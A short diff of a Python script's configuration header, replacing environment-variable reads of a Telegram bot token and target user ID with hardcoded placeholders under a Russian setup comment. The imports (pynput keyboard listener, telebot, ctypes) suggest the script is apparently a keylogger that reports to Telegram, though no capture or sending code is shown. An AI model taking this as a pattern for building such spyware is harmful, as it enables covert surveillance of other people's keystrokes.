@@ -1,6 +1,5 @@
 import ctypes
 import json
-import os
 import sys
 import threading
 import time
@@ -11,8 +10,9 @@ from typing import Optional
 import telebot
 from pynput import keyboard
 
-BOT_TOKEN = os.environ.get("SERVER_BOT_TOKEN", "YOUR_SERVER_BOT_TOKEN")
-TARGET_USER_ID = os.environ.get("TARGET_USER_ID", "123456789")
+# Настройте эти параметры один раз перед запуском.
+BOT_TOKEN = "YOUR_SERVER_BOT_TOKEN"
+TARGET_USER_ID = "123456789"  # ваш Telegram user ID
 
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
 stop_event = threading.Event()
